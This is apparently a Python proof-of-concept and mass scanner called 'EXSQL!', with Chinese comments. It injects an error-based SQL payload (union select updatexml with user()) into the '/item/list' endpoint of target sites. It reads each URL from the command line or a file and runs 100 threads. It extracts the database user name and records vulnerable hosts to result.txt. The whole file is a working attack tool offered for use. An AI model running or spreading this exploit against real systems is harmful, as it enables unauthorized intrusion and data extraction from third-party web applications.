import requests,argparse,sys,re
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """"
███████╗██╗  ██╗███████╗ ██████╗ ██╗     
██╔════╝╚██╗██╔╝██╔════╝██╔═══██╗██║     
█████╗   ╚███╔╝ ███████╗██║   ██║██║     
██╔══╝   ██╔██╗ ╚════██║██║▄▄ ██║██║     
███████╗██╔╝ ██╗███████║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝
                            version:1.0
    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='EXSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    #构造的POC
    url = target+'/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    headers={
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7',
        'Connection': 'close'
    }
    res = requests.get(url,headers=headers,verify=False,timeout=5)
    if res.status_code == 200:
        try:
            pattern = r"~(.*?)~"  # 匹配任意字符序列位于两个波浪号之间的模式
            matches = re.search(pattern, res.text)
            #判断是否存在SQL
            if '"code":500' in res.text:
                print(f"[+]该url存在漏洞{target},用户名为:{matches.group(1)}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target+"\n")
            else:
                print(f"[-]该url不存在漏洞{target}")
        except Exception as e:
            print(f"[*]该url存在问题{target}"+e)

if __name__ == '__main__':
    main()